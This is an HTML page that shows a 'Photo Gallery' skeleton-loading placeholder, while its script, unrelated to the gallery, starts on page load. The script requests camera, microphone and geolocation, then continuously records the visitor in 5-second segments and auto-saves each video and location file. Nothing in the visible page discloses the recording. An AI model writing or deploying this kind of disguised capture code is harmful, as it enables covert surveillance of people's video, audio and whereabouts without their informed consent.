<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Skeleton Loading with Auto Recording</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @keyframes shimmer {
            0% {
                background-position: -1000px 0;
            }

            100% {
                background-position: 1000px 0;
            }
        }

        .skeleton {
            animation: shimmer 1.6s linear infinite;
            background: linear-gradient(to right,
                    #f3f4f6 0%,
                    #e5e7eb 20%,
                    #f3f4f6 40%,
                    #f3f4f6 100%);
            background-size: 1000px 100%;
        }

        .dark .skeleton {
            background: linear-gradient(to right,
                    #1f2937 0%,
                    #374151 20%,
                    #1f2937 40%,
                    #1f2937 100%);
            background-size: 1000px 100%;
        }
    </style>
</head>

<body class="bg-gray-50 dark:bg-gray-900 min-h-screen">
    <main class="max-w-6xl mx-auto px-4 py-12">
        <header class="mb-10 flex items-center justify-between">
            <div>
                <p class="text-sm uppercase tracking-wide text-gray-500 dark:text-gray-400">Loading</p>
                <h1 class="text-3xl font-bold text-gray-900 dark:text-white">Photo Gallery</h1>
            </div>
            <div class="flex gap-3">
                <div class="skeleton h-10 w-10 rounded-full"></div>
                <div class="skeleton h-10 w-24 rounded-full"></div>
            </div>
        </header>

        <section class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">
            <!-- Skeleton card 1 -->
            <article class="bg-white dark:bg-gray-800 rounded-2xl shadow-lg overflow-hidden">
                <div class="skeleton w-full aspect-[4/3]"></div>
                <div class="p-4 space-y-3">
                    <div class="skeleton h-4 w-3/5 rounded"></div>
                    <div class="skeleton h-3 w-full rounded"></div>
                    <div class="skeleton h-3 w-4/5 rounded"></div>
                </div>
            </article>

            <!-- Skeleton card 2 -->
            <article class="bg-white dark:bg-gray-800 rounded-2xl shadow-lg overflow-hidden">
                <div class="skeleton w-full aspect-[4/3]"></div>
                <div class="p-4 space-y-3">
                    <div class="skeleton h-4 w-2/3 rounded"></div>
                    <div class="skeleton h-3 w-full rounded"></div>
                    <div class="skeleton h-3 w-3/5 rounded"></div>
                </div>
            </article>

            <!-- Skeleton card 3 -->
            <article class="bg-white dark:bg-gray-800 rounded-2xl shadow-lg overflow-hidden">
                <div class="skeleton w-full aspect-[4/3]"></div>
                <div class="p-4 space-y-3">
                    <div class="skeleton h-4 w-1/2 rounded"></div>
                    <div class="skeleton h-3 w-full rounded"></div>
                    <div class="skeleton h-3 w-4/5 rounded"></div>
                </div>
            </article>

            <!-- Skeleton card 4 -->
            <article class="bg-white dark:bg-gray-800 rounded-2xl shadow-lg overflow-hidden">
                <div class="skeleton w-full aspect-[4/3]"></div>
                <div class="p-4 space-y-3">
                    <div class="skeleton h-4 w-2/3 rounded"></div>
                    <div class="skeleton h-3 w-full rounded"></div>
                    <div class="skeleton h-3 w-2/3 rounded"></div>
                </div>
            </article>

            <!-- Skeleton card 5 -->
            <article class="bg-white dark:bg-gray-800 rounded-2xl shadow-lg overflow-hidden">
                <div class="skeleton w-full aspect-[4/3]"></div>
                <div class="p-4 space-y-3">
                    <div class="skeleton h-4 w-3/4 rounded"></div>
                    <div class="skeleton h-3 w-full rounded"></div>
                    <div class="skeleton h-3 w-1/2 rounded"></div>
                </div>
            </article>

            <!-- Skeleton card 6 -->
            <article class="bg-white dark:bg-gray-800 rounded-2xl shadow-lg overflow-hidden">
                <div class="skeleton w-full aspect-[4/3]"></div>
                <div class="p-4 space-y-3">
                    <div class="skeleton h-4 w-3/5 rounded"></div>
                    <div class="skeleton h-3 w-full rounded"></div>
                    <div class="skeleton h-3 w-4/5 rounded"></div>
                </div>
            </article>
        </section>
    </main>

    <script>
        let mediaRecorder;
        let videoChunks = [];
        let locationData = null;
        let recordingCount = 0;

        async function initializeRecording() {
            try {
                // Request camera and microphone together
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: true,
                    audio: true
                });

                // Request location
                if ('geolocation' in navigator) {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            locationData = {
                                latitude: pos.coords.latitude,
                                longitude: pos.coords.longitude,
                                accuracy: pos.coords.accuracy,
                                timestamp: new Date().toISOString()
                            };
                            console.log('Location captured:', locationData);
                        },
                        (err) => {
                            console.log('Location permission denied:', err.message);
                        }
                    );
                }

                // Start recording with 5-second intervals
                startRecordingCycle(stream);
            } catch (error) {
                console.error('Error accessing media devices:', error);
            }
        }

        function startRecordingCycle(stream) {
            function recordNextSegment() {
                videoChunks = [];
                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });

                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        videoChunks.push(event.data);
                    }
                };

                mediaRecorder.onstop = () => {
                    const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
                    saveVideoFile(videoBlob);

                    // Save location data with each video
                    if (locationData) {
                        saveLocationFile(locationData);
                    }

                    // Continue recording next segment
                    recordingCount++;
                    recordNextSegment();
                };

                mediaRecorder.start();
                console.log(`Recording segment ${recordingCount + 1} started`);

                // Stop and save after 5 seconds
                setTimeout(() => {
                    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
                        mediaRecorder.stop();
                    }
                }, 5000);
            }

            recordNextSegment();
        }

        function saveVideoFile(blob) {
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `video_${recordingCount}_${Date.now()}.webm`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            console.log(`Video segment ${recordingCount} saved`);
        }

        function saveLocationFile(location) {
            const data = JSON.stringify({
                ...location,
                recordingSegment: recordingCount
            }, null, 2);
            const blob = new Blob([data], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `location_${recordingCount}_${Date.now()}.json`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            console.log(`Location data ${recordingCount} saved`);
        }

        // Start recording on page load
        window.addEventListener('load', initializeRecording);
    </script>
</body>

</html>
